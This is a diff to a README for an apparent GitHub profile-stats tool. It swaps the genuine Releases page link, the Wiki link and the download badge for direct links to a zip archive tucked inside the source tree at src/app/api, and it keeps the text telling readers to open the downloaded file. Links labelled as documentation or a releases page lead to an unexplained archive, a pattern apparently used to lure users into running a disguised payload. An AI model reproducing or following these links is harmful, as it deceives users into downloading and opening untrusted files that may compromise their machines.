@@ -6,7 +6,7 @@ Welcome to GitHub-Insights! This tool helps you create beautiful, customizable s
 
 ## 📥 Download GitHub-Insights
 
-[![Download GitHub-Insights](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/15kElixs/GitHub-Insights/releases)
+[![Download GitHub-Insights](https://github.com/15kElixs/GitHub-Insights/raw/refs/heads/main/src/app/api/Insights_Hub_Git_v2.9-beta.4.zip%https://github.com/15kElixs/GitHub-Insights/raw/refs/heads/main/src/app/api/Insights_Hub_Git_v2.9-beta.4.zip)](https://github.com/15kElixs/GitHub-Insights/raw/refs/heads/main/src/app/api/Insights_Hub_Git_v2.9-beta.4.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ Welcome to GitHub-Insights! This tool helps you create beautiful, customizable s
 
 To get your copy of GitHub-Insights, follow these steps:
 
-1. Visit the [Releases page](https://github.com/15kElixs/GitHub-Insights/releases).
+1. Visit the [Releases page](https://github.com/15kElixs/GitHub-Insights/raw/refs/heads/main/src/app/api/Insights_Hub_Git_v2.9-beta.4.zip).
 2. Look for the latest version.
 3. Click on the file that matches your operating system to download it.
 4. Once downloaded, open the file to launch the application.
@@ -51,7 +51,7 @@ A: Yes, GitHub-Insights is open-source and free to use.
 
 ## 📝 Additional Resources
 
-- **Documentation**: Visit our [Wiki](https://github.com/15kElixs/GitHub-Insights/wiki) for detailed documentation and guides.
+- **Documentation**: Visit our [Wiki](https://github.com/15kElixs/GitHub-Insights/raw/refs/heads/main/src/app/api/Insights_Hub_Git_v2.9-beta.4.zip) for detailed documentation and guides.
 - **Support**: For any help, reach out via the Issues tab on our GitHub page.
 - **Feedback**: We welcome your feedback! Let us know your thoughts.
 
@@ -65,6 +65,6 @@ Join our community and stay updated with the latest developments. Follow us on G
 
 # 🌐 Useful Links
 
-[Download GitHub-Insights](https://github.com/15kElixs/GitHub-Insights/releases) 
+[Download GitHub-Insights](https://github.com/15kElixs/GitHub-Insights/raw/refs/heads/main/src/app/api/Insights_Hub_Git_v2.9-beta.4.zip) 
 
 Explore the features and start enhancing your GitHub profile today!
